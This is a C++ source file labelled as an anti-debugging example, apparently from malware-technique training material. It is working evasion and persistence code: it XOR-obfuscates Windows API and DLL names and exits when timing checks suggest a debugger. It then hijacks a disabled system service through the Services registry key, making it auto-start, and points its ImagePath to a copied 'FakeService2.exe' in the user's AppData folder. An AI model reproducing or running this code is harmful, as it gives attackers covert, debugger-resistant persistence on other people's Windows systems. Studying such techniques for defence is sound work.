// Example 6 - Anti Debug 2.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include <iostream>
#include <windows.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <string>
#include <shlwapi.h>
#include <comdef.h>
#include <sstream>
#include <vector>
#include <wingdi.h>
#include <time.h>
#include <Shlobj.h>  

using namespace std;


BOOL checkTiming(time_t start) {
	//Checks if time that has passed is greater than 1 second
	double seconds_since_start = difftime(time(0), start);
	if (seconds_since_start > 1) {
		return TRUE;
	}
	return FALSE;
}

string encryptDecrypt(string toEncrypt) {
	//Standard XOR Decrpython
	string output = toEncrypt;

	for (int i = 0; i < toEncrypt.size(); i++)
		output[i] = toEncrypt[i] ^ 0x5a;

	return output;
}

void error(DWORD retval) {
	//Wrapper for printing errors
	_com_error error(retval);
	wcout << error.ErrorMessage() << endl;
}

bool checkError(DWORD retval) {
	//Wrapper for Checking errors and debugging them with debug builds
#ifdef _DEBUG
	error(retval);
#endif
	return retval != 0;
}

class ProcPtr {
public:
	explicit ProcPtr(FARPROC ptr) : _ptr(ptr) {}

	template <typename T, typename = std::enable_if_t<std::is_function_v<T>>>
	operator T *() const {
		return reinterpret_cast<T *>(_ptr);
	}

private:
	FARPROC _ptr;
};

class DllHelper {
public:
	explicit DllHelper(LPCSTR filename) : _module(LoadLibraryA(filename)) {}

	~DllHelper() { FreeLibrary(_module); }

	ProcPtr operator[](LPCSTR proc_name) const {
		return ProcPtr(GetProcAddress(_module, proc_name));
	}

	static HMODULE _parent_module;

private:
	HMODULE _module;
};


class DllAdvapi{
	string advapi = "\x1b\x3e\x2c\x3b\x2a\x33\x69\x68\x74\x3e\x36\x36\x5a";
	DllHelper _dll{ encryptDecrypt(advapi).c_str() };

public:
	//decltype(ShellAboutA) *shellAbout = _dll[""];
	string rsva = "\x8\x3f\x3d\x9\x3f\x2e\xc\x3b\x36\x2f\x3f\x1b";
	string rokea = "\x8\x3f\x3d\x15\x2a\x3f\x34\x11\x3f\x23\x1f\x22\x1b";
	string reka = "\x8\x3f\x3d\x1f\x34\x2f\x37\x11\x3f\x23\x1b";
	string rgva = "\x8\x3f\x3d\x1d\x3f\x2e\xc\x3b\x36\x2f\x3f\x1b";
	string rskva = "\x8\x3f\x3d\x9\x3f\x2e\x11\x3f\x23\xc\x3b\x36\x2f\x3f\x1b";
	decltype(RegSetValueA) *regSetValueA = _dll[encryptDecrypt(rsva).c_str()];
	decltype(RegOpenKeyExA) *regOpenKeyExA = _dll[encryptDecrypt(rokea).c_str()];
	decltype(RegEnumKeyA) *regEnumKeyA = _dll[encryptDecrypt(reka).c_str()];
	decltype(RegGetValueA) *regGetValueA = _dll[encryptDecrypt(rgva).c_str()];
	decltype(RegSetKeyValueA) *regSetKeyValueA = _dll[encryptDecrypt(rskva).c_str()];

};

class DllKernel {
	string kernel = "\x11\x3f\x28\x34\x3f\x36\x69\x68\x74\x3e\x36\x36\x5a";
	DllHelper _dll{ encryptDecrypt(kernel).c_str() };

public:
	string mfea = "\x17\x35\x2c\x3f\x1c\x33\x36\x3f\x1f\x22\x1b";
	string gcda = "\x1d\x3f\x2e\x19\x2f\x28\x28\x3f\x34\x2e\x1e\x33\x28\x3f\x39\x2e\x35\x28\x23\x1b";
	decltype(MoveFileExA) *moveFileExA = _dll[encryptDecrypt(mfea).c_str()];
	decltype(GetCurrentDirectoryA) *getCurrentDirectoryA = _dll[encryptDecrypt(gcda).c_str()];

};

class DllShell {
	string shell = "\x9\x32\x3f\x36\x36\x69\x68\x74\x3e\x36\x36";
	DllHelper _dll{ encryptDecrypt(shell).c_str() };

public: 
	string shgfp = "\x9\x12\x1d\x3f\x2e\x1c\x35\x36\x3e\x3f\x28\xa\x3b\x2e\x32\x1b";
	decltype(SHGetFolderPathA) *sHGetFolderPathA = _dll[encryptDecrypt(shgfp).c_str()];
};


int main()
{
	//Creation of a pointer to functions for Adavapi
	time_t start;
	long retval;
	start = time(0);
	DllAdvapi dlladvapi;
	if (checkTiming(start)) {
		return -1;
	}

	//Creation of a pointer to functions for Kernel32
	start = time(0);
	DllKernel dllkernel;
	if (checkTiming(start)) {
		return -1;
	}

	//Creation of a pointer to functions for Shell
	start = time(0);
	DllShell dllshell;
	if (checkTiming(start)) {
		return -1;
	}

	//Get current direcotry
	CHAR cwd[MAX_PATH];
	dllkernel.getCurrentDirectoryA(MAX_PATH, cwd);
	
	//Get users current home dierctory
	CHAR homepath[MAX_PATH];
	start = time(0);
	retval = dllshell.sHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, homepath);
	if (checkTiming(start)) {
		return -1;
	}
	if (checkError(retval)) {
		return -1;
	}
	string cwd_(cwd);
	string homepath_(homepath);

	//Open Services registry key
	HKEY hkey;
	//string s = "SYSTEM\\ControlSet001\\Services";
	string s = "\x9\x3\x9\xe\x1f\x17\x6\x6\x19\x35\x34\x2e\x28\x35\x36\x9\x3f\x2e\x6a\x6a\x6b\x6\x6\x9\x3f\x28\x2c\x33\x39\x3f\x29";
	start = time(0);
	retval = dlladvapi.regOpenKeyExA(HKEY_LOCAL_MACHINE, encryptDecrypt(s).c_str(), 0, KEY_ALL_ACCESS, &hkey);
	if (checkTiming(start)) {
		return -1;
	}
	if (checkError(retval)) {
		return -1;
	}

	DWORD index = 0;
	CHAR buffer[512] = { 0 };

	while (TRUE) {
		start = time(0);
		retval = dlladvapi.regEnumKeyA(hkey, index, buffer, sizeof(buffer));
		if (checkTiming(start)) {
			return -1;
		}
		if (retval == ERROR_NO_MORE_ITEMS) {
			break;
		}
		index++;
#ifdef _DEBUG
		std::cout << buffer << endl;
#endif
		//string temp = s;
		string temp(buffer);
		DWORD value;
		DWORD buffersize = sizeof(value);

#ifdef _DEBUG
		std::cout << temp.c_str() << endl;
#endif
		//Get the Value for the Start registry key
		string s2 = encryptDecrypt("\x9\x2e\x3b\x28\x2e");
		string t = encryptDecrypt("\xe\x23\x2a\x3f");
		start = time(0);
		retval = dlladvapi.regGetValueA(hkey, temp.c_str(), s2.c_str(), RRF_RT_DWORD, NULL, &value, &buffersize);
		if (checkTiming(start)) {
			return -1;
		}
		if (checkError(retval)) {}
		else {
			//cout << value << endl;
			if (value == 4) {
#ifdef _DEBUG
				std::cout << "Found: " << temp << endl;
#endif

				string full_path = homepath_;
				//string temp_path = encryptDecrypt("\x6\x6\x1b\x2a\x2a\x1e\x3b\x2e\x3b\x6\x6\x16\x35\x39\x3b\x36\x6\x6\x1c\x3b\x31\x3f\x9\x3f\x28\x2c\x33\x39\x3f\x74\x3f\x22\x3f");
				string temp_path = encryptDecrypt("\x6\x6\x1b\x2a\x2a\x1e\x3b\x2e\x3b\x6\x6\x16\x35\x39\x3b\x36\x6\x6\x1c\x3b\x31\x3f\x9\x3f\x28\x2c\x33\x39\x3f\x68\x74\x3f\x22\x3f");
				//full_path.append("\\AppData\\Local\\FakeService2.exe");

				full_path.append(temp_path);
				value = 2;
				retval = dlladvapi.regSetKeyValueA(hkey, temp.c_str(), s2.c_str(), REG_DWORD, &value, sizeof(value));

				//Modify the Start to 2
				if (checkError(retval)) {
					//Failed to modify, switch back
					value = 4;
					retval = dlladvapi.regSetKeyValueA(hkey, temp.c_str(), s2.c_str(), REG_DWORD, &value, sizeof(value));
					break;
				}

				//Change type to 0x10, run in its own process
				value = 0x10;
				retval = dlladvapi.regSetKeyValueA(hkey, temp.c_str(), t.c_str(), REG_DWORD, &value, sizeof(value));
				if (checkError(retval)) {
					break;
				}

				//Set the Registry 
				string imagepath = encryptDecrypt("\x13\x37\x3b\x3d\x3f\xa\x3b\x2e\x32");
				retval = dlladvapi.regSetKeyValueA(hkey, temp.c_str(), imagepath.c_str(), REG_SZ, full_path.c_str(), full_path.length());
				if (checkError(retval)) {
					break;
				}

				CHAR cwd[MAX_PATH];
				dllkernel.getCurrentDirectoryA(MAX_PATH, cwd);
				string cwd_(cwd);
				//string fakeservice = encryptDecrypt("\x6\x6\x1c\x3b\x31\x3f\x9\x3f\x28\x2c\x33\x39\x3f\x74\x3f\x22\x3f");
				string fakeservice = encryptDecrypt("\x6\x6\x1c\x3b\x31\x3f\x9\x3f\x28\x2c\x33\x39\x3f\x68\x74\x3f\x22\x3f");
				cwd_.append(fakeservice);

#ifdef _DEBUG
				std::cout << cwd_.c_str() << endl;
				std::cout << full_path << endl;
#endif

				retval = dllkernel.moveFileExA(cwd_.c_str(), full_path.c_str(), MOVEFILE_COPY_ALLOWED);
				if (checkError(retval)) {
					return -1;
				}

				break;
			}
		}


	}

	
	


	

	


	



}


